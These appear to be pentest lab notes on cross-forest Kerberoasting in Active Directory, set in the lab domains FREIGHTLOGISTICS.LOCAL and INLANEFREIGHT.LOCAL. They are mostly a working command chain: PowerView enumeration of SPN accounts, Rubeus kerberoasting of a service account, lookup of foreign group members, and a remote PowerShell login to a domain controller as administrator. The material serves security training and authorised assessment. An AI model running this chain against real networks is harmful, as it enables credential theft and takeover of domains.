
## Cross-Forest Kerberoasting

#### Enumerating Accounts for Associated SPNs Using Get-DomainUser

```ruby
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

### Enumerating the User Account

```
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```

#### Performing a Kerberoasting Attacking with Rubeus Using /domain Flag


```
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

## Using Get-DomainForeignGroupMember

```
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```
```
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
```

## Accessing DC03 Using Enter-PSSession

```
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

From the command output above, we can see that we successfully authenticated to the Domain Controller in the `FREIGHTLOGISTICS.LOCAL` domain using the Administrator account from the `INLANEFREIGHT.LOCAL` domain across the bidirectional forest trust. This can be a quick win after taking control of a domain and is always worth checking for if a bidirectional forest trust situation is present during an assessment and the second forest is in-scope.

